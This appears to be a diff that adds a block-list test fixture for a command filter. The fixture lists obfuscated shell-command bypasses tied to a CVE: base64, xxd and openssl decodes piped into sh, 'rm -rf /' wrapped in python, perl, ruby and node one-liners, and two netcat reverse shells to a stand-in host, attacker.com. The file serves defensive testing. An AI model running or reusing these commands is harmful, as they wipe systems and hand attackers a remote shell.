@@ -1,0 +1,27 @@
+# CVE-2025-66032: Encoding/obfuscation bypasses (must ALL be blocked)
+# base64 decode to shell
+echo "cm0gLXJmIC8=" | base64 -d | sh
+echo "cm0gLXJmIC8=" | base64 -d | bash
+base64 -d payload.b64 | bash
+# xxd reverse to shell
+echo "abcd" | xxd -r -p | sh
+xxd -r payload.hex | bash
+# openssl decode
+echo "abcd" | openssl base64 -d | sh
+openssl enc -d -aes256 -in payload.enc | sh
+# python code execution
+python -c "import base64; exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk='))"
+python -c "import os; os.system('rm -rf /')"
+python -c "import subprocess; subprocess.Popen(['rm', '-rf', '/'])"
+python -c "import os,base64;eval(compile(base64.b64decode('cHJpbnQoJ2hlbGxvJyk='),'','exec'))"
+# perl one-liner
+perl -e 'exec("rm -rf /")'
+perl -e 'system("nc -e /bin/sh attacker.com 4444")'
+# ruby one-liner
+ruby -e 'exec("rm -rf /")'
+ruby -e 'require "open3"; Open3.popen3("nc -e /bin/sh attacker.com 4444")'
+# node one-liner
+node -e 'require("child_process").exec("rm -rf /")'
+# encoded eval
+eval $(echo "base64 encoded string")
+eval ${HOME}
